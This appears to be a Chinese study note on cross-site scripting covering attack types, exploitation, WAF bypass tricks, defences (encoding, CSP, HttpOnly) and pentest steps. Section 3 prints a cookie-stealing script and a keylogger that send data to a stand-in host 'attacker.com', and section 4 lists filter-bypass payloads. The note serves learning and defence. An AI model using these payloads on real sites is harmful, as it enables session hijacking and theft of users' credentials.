XSS（跨站脚本攻击）与 [[SQL注入]] 同为 OWASP Top 10 中的经典 Web 漏洞，常与 [[Burp Suite]]、[[Hydra]] 等工具配合进行渗透测试。本笔记聚焦 XSS 的攻击方式、绕过技巧与防御策略。

---

# 一、概念

XSS（Cross-Site Scripting，跨站脚本攻击）是一种代码注入攻击。攻击者将恶意脚本注入到可信网站的页面中，当其他用户浏览该页面时，**恶意脚本**会在用户浏览器中执行[-5](https://semgrep.dev/docs/learn/vulnerabilities/cross-site-scripting)。由于这些代码来自“可信”站点，浏览器会默认授予其访问 Cookie、会话令牌等敏感信息的权限[-5](https://semgrep.dev/docs/learn/vulnerabilities/cross-site-scripting)。

**核心危害**：**JavaScript 在浏览器中能做到的事情，XSS 攻击几乎都能做到。** 包括窃取 Cookie 实现会话劫持、执行未授权操作、键盘记录、钓鱼攻击、传播蠕虫等[-11](https://developer.baidu.com/article/detail.html?id=3361362)。

XSS 是 CVE 数据库中报告最频繁的 Web 漏洞之一，长期位于 OWASP Top 10 榜单[-5](https://semgrep.dev/docs/learn/vulnerabilities/cross-site-scripting)。

**攻击本质**：应用程序的“交互性”要求将用户输入回显到页面上，当该输入未被安全处理时，浏览器会将其解析为可执行代码而非纯文本，从而导致攻击[-5](https://semgrep.dev/docs/learn/vulnerabilities/cross-site-scripting)。

---

# 二、攻击方式

XSS 攻击主要分为三类：**反射型**、**存储型**、**DOM 型**[-5](https://semgrep.dev/docs/learn/vulnerabilities/cross-site-scripting)。前两种需要经过服务器，最后一种仅涉及客户端，由前端 JS 逻辑缺陷导致-。

## 2.1 反射型 XSS（Reflected XSS）

**攻击流程**：攻击者将恶意脚本附加到 URL 参数中，通过钓鱼等方式诱骗用户点击链接，服务器将参数“反射”回页面，浏览器执行恶意脚本[-3](https://cloud.baidu.com/article/3361360)[-11](https://developer.baidu.com/article/detail.html?id=3361362)。

**数据流向**：前端 → 后端 → 前端（一次性反射）[-11](https://developer.baidu.com/article/detail.html?id=3361362)。

**典型场景**：搜索框、URL 参数直接回显的页面。

**示例**：用户访问 `https://example.com/search?q=<script>alert('XSS')</script>`，若服务器未过滤，页面弹出警告框[-5](https://semgrep.dev/docs/learn/vulnerabilities/cross-site-scripting)。

**实战案例**：NASA 某子域名曾因 User-Agent 输入未过滤导致反射型 XSS，攻击者可利用该漏洞窃取会话 Cookie[-24](https://bugcrowd.com/disclosures/da0e3345-4a66-428f-a4d4-55f8dbf9c589/reflected-xss-exploit-chain-with-session-cookie-theft-on-nasa-subdomain)。

## 2.2 存储型 XSS（Stored XSS）

**攻击流程**：恶意脚本被永久存储在服务器（数据库或文件系统），当任何用户访问受影响页面时，脚本自动从服务器加载并执行[-5](https://semgrep.dev/docs/learn/vulnerabilities/cross-site-scripting)[-3](https://cloud.baidu.com/article/3361360)。

**数据流向**：前端 → 后端 → 存储 → 前端[-11](https://developer.baidu.com/article/detail.html?id=3361362)。

**典型场景**：留言板、评论区、用户资料、帖子内容。

**示例**：攻击者在评论区提交 `<img src="x" onerror="alert('XSS')"/>`，其他用户访问该页面时弹出警告框[-3](https://cloud.baidu.com/article/3361360)。

**实战案例**：富士通披露的 CVE-2024-42834 漏洞中，攻击者通过 API 在用户姓氏字段注入恶意脚本，管理员查看客户记录时脚本自动执行，可窃取会话令牌、冒充用户[-25](https://corporate-blog.global.fujitsu.com/apac/2025-08-26/01/)。

## 2.3 DOM 型 XSS（DOM-based XSS）

**攻击流程**：不依赖服务器，通过修改客户端 DOM 环境执行恶意代码，页面本身无变化，但 DOM 被恶意修改导致代码执行[-1](https://cloud.tencent.cn/developer/article/2437214?from=15425)。

**典型场景**：使用 `location.hash`、`document.referrer`、`document.URL` 等客户端源的 JS 逻辑。

**示例**：页面 JS 执行 `document.body.innerHTML = location.hash`，攻击者构造 URL `https://example.com/#<img src=x onerror=alert(1)>`，恶意代码被执行[-5](https://semgrep.dev/docs/learn/vulnerabilities/cross-site-scripting)。

## 2.4 三种类型对比

|类型|存储位置|是否需要服务器|持久性|危害范围|
|---|---|---|---|---|
|反射型|无（URL 中）|是|非持久（一次触发）|单个用户|
|存储型|服务器数据库|是|持久|所有访问用户|
|DOM 型|浏览器 DOM|否|视具体场景|取决于漏洞位置|

---

# 三、攻击利用方式

XSS 攻击者可利用 JavaScript 在浏览器中执行以下操作[-1](https://cloud.tencent.cn/developer/article/2437214?from=15425)：

## 3.1 窃取 Cookie 与会话劫持
```javascript
// 将 Cookie 发送到攻击者服务器
<script>window.location='http://attacker.com/steal.php?cookie='+document.cookie</script>
```
获得 Cookie 后，攻击者可冒充用户身份登录。

## 3.2 键盘记录
```javascript
// 监听并发送键盘输入
<script>
document.onkeypress = function(e) {
    fetch('http://attacker.com/log', {method:'POST', body:e.key});
}
</script>
```
## 3.3 钓鱼攻击

通过修改页面 DOM 伪造登录框，窃取用户密码。常见于存储型 XSS。

## 3.4 内网探测

利用 JavaScript 发起内网请求，探测内网资产，常用于跳板攻击。

## 3.5 挂马与蠕虫传播

利用 XSS 漏洞传播恶意软件或跨站脚本蠕虫[-11](https://developer.baidu.com/article/detail.html?id=3361362)。

---

# 四、绕过技巧与 WAF 对抗

## 4.1 标签与属性枚举

应用程序通常会过滤某些标签或属性，但往往不会过滤全部。可使用 [[Burp Suite]] 的 **Intruder** 模块枚举允许的标签和属性，从而构造有效的 payload[-21](https://portswigger.net/burp/documentation/desktop/testing-workflow/vulnerabilities/input-validation/xss/bypassing-filters)。

**流程**：

1. 将请求发送到 Intruder
2. 用 `<§§>` 测试标签，用 `<tag §§="test">` 测试属性
3. 观察哪些标签/属性返回 200 状态码
4. 利用允许的标签和属性构造 payload[-21](https://portswigger.net/burp/documentation/desktop/testing-workflow/vulnerabilities/input-validation/xss/bypassing-filters)

PortSwigger 提供 XSS Cheat Sheet 可直接使用[-21](https://portswigger.net/burp/documentation/desktop/testing-workflow/vulnerabilities/input-validation/xss/bypassing-filters)。

## 4.2 常见过滤绕过方法

|过滤方式|绕过技巧|示例|
|---|---|---|
|`<script>` 过滤|使用其他标签 + 事件|`<img src=x onerror=alert(1)>`|
|关键字过滤（`alert`）|使用编码或 `eval`|`alert` → `\u0061lert`|
|引号过滤|闭合引号|`"> <img src=x onerror=alert(1)>`|
|大小写检测|大小写混合|`<ScRiPt>alert(1)</sCrIpT>`|
|双写绕过|双写关键字|`<scrscriptipt>alert(1)</scrscriptipt>`|
|Unicode 编码|编码 payload|`javascript:alert(1)` 编码|

**详细绕过方法参考**：[-39](https://www.cnblogs.com/TNpiper/p/18568929)

## 4.3 利用 XSS 工具

- **XSStrike**：高级 XSS 检测与绕过框架[-39](https://www.cnblogs.com/TNpiper/p/18568929)
- **XSS-Labs**：XSS 通关靶场[-39](https://www.cnblogs.com/TNpiper/p/18568929)

---

# 五、防御措施

## 5.1 输入验证与输出编码

**核心原则**：永远不要信任用户输入。对输出到 HTML 的内容根据上下文进行适当编码[-3](https://cloud.baidu.com/article/3361360)。

|输出上下文|编码方式|示例|
|---|---|---|
|HTML 标签间|HTML 实体编码|`<` → `&lt;`，`>` → `&gt;`|
|HTML 属性内|属性值编码|对 `"` 和 `'` 编码|
|JavaScript 字符串|Unicode 转义|`'` → `\x27`|
|URL 参数|URL 编码|`<` → `%3C`|

**函数示例**：PHP 中 `htmlspecialchars()`，JavaScript 中 `encodeURIComponent()`，前端可用 **DOMPurify** 库清理用户输入[-3](https://cloud.baidu.com/article/3361360)。

**安全 DOM 操作**：避免使用 `innerHTML` 直接插入用户输入，改用 `textContent` 或 `createTextNode`[-3](https://cloud.baidu.com/article/3361360)。

## 5.2 CSP（Content Security Policy）

CSP 是浏览器端的可信白名单机制，限制网站可加载和执行的资源[-39](https://www.cnblogs.com/TNpiper/p/18568929)。配置正确可有效阻断 XSS 执行，即使存在注入点，恶意脚本也会被浏览器拒绝。

**配置示例**：
```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com;
```
该配置仅允许来自同源和指定 CDN 的脚本执行[-3](https://cloud.baidu.com/article/3361360)。

**CSP 关键指令**[-16](https://mdr.skyeye.qianxin.com/forum/share/4535)：

|指令|作用|
|---|---|
|`default-src`|默认资源来源（可被更具体指令覆盖）|
|`script-src`|JavaScript 来源|
|`style-src`|CSS 来源|
|`img-src`|图片来源|
|`connect-src`|fetch、XHR、WebSocket 等连接来源|
|`frame-ancestors`|限制页面可被哪些来源嵌入（防点击劫持）|

**规则值**：`'none'`（禁止任何资源）、`'self'`（仅允许同源）、`'unsafe-inline'`（允许内联脚本，不推荐）、`'unsafe-eval'`（允许 `eval()`，不推荐）[-16](https://mdr.skyeye.qianxin.com/forum/share/4535)。

**注意**：CSP 默认禁止内联脚本和 `eval()`，可通过 `nonce-xxx` 或 `hash-xxx` 方式白名单放行特定脚本[-16](https://mdr.skyeye.qianxin.com/forum/share/4535)。

## 5.3 HttpOnly Cookie

设置 Cookie 的 `HttpOnly` 属性，禁止 JavaScript 通过 `document.cookie` 访问该 Cookie[-35](https://cloud.baidu.com/article/3294522)。可有效防御 XSS 窃取会话 Cookie，但无法防御键盘记录、钓鱼等攻击[-39](https://www.cnblogs.com/TNpiper/p/18568929)。

**设置方法**：

- PHP：`session.cookie_httponly = 1` 或 `setcookie(..., true)`
- Java Servlet：`cookie.setHttpOnly(true)`

## 5.4 禁用危险函数

- 避免使用 `eval()`、`setTimeout()`/`setInterval()` 字符串参数、`new Function()` 等动态执行代码的方式[-35](https://cloud.baidu.com/article/3294522)
- 限制 `document.write()` 的使用

## 5.5 禁用危险 HTML 标签

在允许用户生成 HTML 内容时，禁用 `<script>`、`<iframe>`、`<object>`、`<embed>` 等标签[-3](https://cloud.baidu.com/article/3361360)。

## 5.6 X-XSS-Protection 头部

设置 `X-XSS-Protection: 1; mode=block` 启用浏览器内置 XSS 过滤器[-34](https://modstart.com/p/4sxygk7i68s3o4hr)。注意：现代浏览器已逐渐弃用此头部，推荐使用 CSP 替代。

---

# 六、防御措施的局限性

|防御措施|局限性|
|---|---|
|**输入过滤/黑名单**|难以覆盖所有变体，WAF 规则可能被绕过，不推荐作为唯一手段-|
|**CSP**|配置复杂易出错，存在绕过技巧（如利用不安全的重定向端点）-|
|**HttpOnly Cookie**|无法防御键盘记录、钓鱼、BeEF 等攻击，只能保护 Cookie[-39](https://www.cnblogs.com/TNpiper/p/18568929)|
|**WAF**|规则库需持续更新，定制化业务场景易产生误报[-11](https://developer.baidu.com/article/detail.html?id=3361362)|

---

# 七、常用工具与资源

|工具/资源|用途|
|---|---|
|[[Burp Suite]]|拦截修改请求，配合 Intruder 枚举标签/属性[-21](https://portswigger.net/burp/documentation/desktop/testing-workflow/vulnerabilities/input-validation/xss/bypassing-filters)|
|**XSStrike**|XSS 检测与绕过框架[-39](https://www.cnblogs.com/TNpiper/p/18568929)|
|**DOMPurify**|JavaScript XSS 清理库[-35](https://cloud.baidu.com/article/3294522)|
|**XSS-Labs**|XSS 通关靶场，练习实战技巧[-39](https://www.cnblogs.com/TNpiper/p/18568929)|
|**PortSwigger XSS Cheat Sheet**|XSS 标签与事件参考表[-21](https://portswigger.net/burp/documentation/desktop/testing-workflow/vulnerabilities/input-validation/xss/bypassing-filters)|
|**BeEF（Browser Exploitation Framework）**|浏览器利用框架，XSS 后续攻击扩展|

---

# 八、渗透测试关注点

**发现注入点时注意**[-1](https://cloud.tencent.cn/developer/article/2437214?from=15425)：

- **用户输入位置**：GET/POST 参数、HTTP 头部（User-Agent、Referer、Cookie）、文件上传名
- **数据输出位置**：搜索结果、评论区、用户资料、错误提示、日志信息
- **隐藏输入**：审查 HTML 源码，寻找 `hidden` 字段，可能存在注入点

**测试流程**[-1](https://cloud.tencent.cn/developer/article/2437214?from=15425)：

1. 定位用户输入点
2. 尝试修改输入并观察输出
3. 分析标签闭合与过滤规则
4. 构造有效 payload 并验证

---

## 九、快速回顾清单

- **三大类型**：反射型（URL 反射）、存储型（数据库存储）、DOM 型（客户端 JS 缺陷）
- **攻击利用**：窃取 Cookie、会话劫持、键盘记录、钓鱼、内网探测
- **防御措施**：输出编码、CSP、HttpOnly Cookie、禁用危险标签/函数
- **绕过技巧**：标签/属性枚举、大小写混合、双写、Unicode 编码
- **工具链**：[[Burp Suite]]（Intruder 枚举）、XSStrike（自动检测）、DOMPurify（前端清理）、BeEF（后续利用）
---

**总结**：XSS 的本质是 **数据被当作代码执行**。防御的核心在于根据输出上下文进行正确编码，而非简单地过滤输入。CSP 是最强有力的深度防御手段，HttpOnly Cookie 是保护会话的基本配置。在渗透测试中，XSS 的利用链条远不止弹窗，结合 BeEF 等框架可实现更复杂的内网渗透。